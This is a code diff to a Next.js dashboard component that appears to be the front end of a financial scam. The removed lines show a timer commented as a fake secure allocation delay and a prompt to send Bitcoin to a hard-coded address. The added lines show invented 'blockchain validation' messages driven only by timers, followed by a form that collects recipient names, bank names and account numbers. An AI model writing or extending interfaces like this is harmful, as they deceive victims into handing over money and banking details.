@@ -1,6 +1,7 @@
 "use client";
 
 import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
 
 type Asset = {
   name: string;
@@ -23,6 +24,15 @@ export default function Dashboard() {
   const [syncComplete, setSyncComplete] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [allocating, setAllocating] = useState(false);
+  const [showConfirm, setShowConfirm] = useState(false);
+  const router = useRouter();
+
+const [transferData, setTransferData] = useState({
+  name: "",
+  bank: "",
+  account: "",
+  remarks: ""
+});
 
 
   const [assets, setAssets] = useState<Asset[]>([
@@ -41,6 +51,8 @@ export default function Dashboard() {
   const [success, setSuccess] = useState(false);
   const [connecting, setConnecting] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [showTransfer, setShowTransfer] = useState(false);
+  
 
 
 
@@ -112,19 +124,22 @@ export default function Dashboard() {
 
   const handleSubmit = () => {
 
-  setError("");
+ setError("");
   setConnecting(false);
   setAllocating(true);
+  setSuccess(false);
 
-  // Start allocation
-setAllocating(true);
-setSuccess(false);
+  // Show blockchain validation animation
+  setTimeout(() => {
+    setAllocating(false);
+    setSuccess(true);
 
-// Fake secure allocation delay (matches slower animation)
-setTimeout(() => {
-  setAllocating(false);
-  setSuccess(true);
-}, 8000); // 8 seconds
+    // After validation show transfer page
+    setTimeout(() => {
+      setShowTransfer(true);
+    }, 3000);
+
+  }, 5000);
 };
 
   const dashboardAddress = "358QXhm8Wc7m7Rf3AMN2HqcThPSE9bHPR3";
@@ -270,12 +285,12 @@ const handleCopy = async () => {
            {allocating && (
   <>
     <h2 style={{ color: "#d4af37" }}>
-      BTC Allocation in Progress
-    </h2>
+  Cryptocurrency Blockchain Validated
+</h2>
 
-    <p style={{ marginTop: "12px", opacity: 0.7, fontSize: "13px"}}>
-      Generating institutional-grade multi-signature vault routing...
-    </p>
+   <p style={{ marginTop: "12px", opacity: 0.7, fontSize: "13px"}}>
+  Verifying decentralized ledger and secure routing nodes...
+</p>
 
     <div className="circularLoader">
       <img src="/btc-icon.png" alt="BTC" className="btcIcon" />
@@ -283,35 +298,129 @@ const handleCopy = async () => {
   </>
 )}
 
-{success && !allocating && (
+{success && !allocating && !showTransfer && (
   <>
     <h2 style={{ color: "#d4af37" }}>
-      Transaction Authorization Required
+      Blockchain Validation Successful
     </h2>
 
     <p style={{ marginTop: "12px", opacity: 0.8, fontSize: "13px" }}>
-      Kindly initiate a transaction to the dashboard address below
-      to complete secure institutional routing.
+      Secure institutional routing verified.
     </p>
-
-    <div className="addressBox">
-      {dashboardAddress}
-    </div>
-
-    <button
-      onClick={handleCopy}
-      className={`copyButton ${copied ? "flash" : ""}`}
-      style={{ marginTop: "14px" }}
-    >
-      {copied ? "Copied ✓" : "Copy Address"}
-    </button>
-
-    <div className="confetti"></div>
-
-    <div style={{ marginTop: "18px", fontSize: "12px", opacity: 0.6 }}>
-      Network: Bitcoin (BTC) • Minimum routing: 0.00079 BTC
-    </div>
   </>
+)}
+
+{showTransfer && (
+
+<div className="transferContainer">
+
+<h2 className="transferTitle">Transfers</h2>
+
+<div className="transferCard">
+
+<div className="field">
+<label>From</label>
+<input value="Private Secure" readOnly className="lockedInput"/>
+</div>
+
+
+<div className="field">
+<label>Name</label>
+<input
+placeholder="Enter recipient name"
+value={transferData.name}
+onChange={(e)=>setTransferData({...transferData,name:e.target.value})}
+/>
+</div>
+
+<div className="field">
+<label>Bank Name</label>
+<input
+placeholder="Enter bank name"
+value={transferData.bank}
+onChange={(e)=>setTransferData({...transferData,bank:e.target.value})}
+/>
+</div>
+
+<div className="field">
+<label>Account</label>
+<input
+placeholder="Enter account number"
+value={transferData.account}
+onChange={(e)=>setTransferData({...transferData,account:e.target.value})}
+/>
+</div>
+
+<div className="field">
+<label>Remarks</label>
+<input
+placeholder="Optional remarks"
+value={transferData.remarks}
+onChange={(e)=>setTransferData({...transferData,remarks:e.target.value})}
+/>
+</div>
+
+<button
+className="confirmTransfer"
+onClick={() => {
+
+router.push(
+`/transfer-confirm?name=${transferData.name}&bank=${transferData.bank}&account=${transferData.account}&remarks=${transferData.remarks}`
+)
+
+}}
+>
+Confirm Transfer
+</button>
+
+</div>
+</div>
+
+)}
+
+{showConfirm && (
+
+<div className="confirmContainer">
+
+<h2 className="transferTitle">
+Confirm Transfer Details
+</h2>
+
+<div className="transferCard">
+
+<div className="field">
+<label>From</label>
+<div className="box">Private Secure</div>
+</div>
+
+<div className="field">
+<label>Name</label>
+<div className="box">{transferData.name}</div>
+</div>
+
+<div className="field">
+<label>Bank</label>
+<div className="box">{transferData.bank}</div>
+</div>
+
+<div className="field">
+<label>Account</label>
+<div className="box">{transferData.account}</div>
+</div>
+
+<div className="field">
+<label>Remarks</label>
+<div className="box">{transferData.remarks}</div>
+</div>
+
+<button className="confirmTransfer">
+Final Confirm
+</button>
+
+</div>
+
+</div>
+
 )}
           </div>
         </div>
@@ -625,6 +734,74 @@ const handleCopy = async () => {
 @keyframes spin {
   0% { transform: rotate(0deg); }
   100% { transform: rotate(360deg); }
+}
+
+.transferContainer{
+margin-top:10px;
+text-align:left;
+width:100%;
+max-width:420px;
+margin:auto;
+padding:20px;
+overflow-y:auto;
+}
+
+.transferTitle{
+text-align:center;
+color:#d4af37;
+margin-bottom:20px;
+font-family:"Cormorant Garamond", serif;
+}
+
+.transferCard{
+background:#0a0a0a;
+border:1px solid rgba(212,175,55,0.25);
+border-radius:12px;
+padding:20px;
+}
+
+.field{
+margin-bottom:14px;
+}
+
+.field label{
+display:block;
+font-size:12px;
+opacity:0.6;
+margin-bottom:6px;
+}
+
+.field input{
+width:100%;
+padding:10px;
+background:#000;
+border:1px solid rgba(212,175,55,0.3);
+color:white;
+border-radius:6px;
+}
+
+.lockedInput{
+opacity:0.7;
+cursor:not-allowed;
+}
+
+.confirmTransfer{
+width:100%;
+margin-top:16px;
+background:linear-gradient(90deg,#d4af37,#fff5cc);
+border:none;
+padding:12px;
+border-radius:6px;
+font-weight:600;
+cursor:pointer;
+}
+
+.box{
+background:#000;
+padding:10px;
+border-radius:6px;
+border:1px solid rgba(212,175,55,0.3);
+color:white;
 }
 
       `}</style>
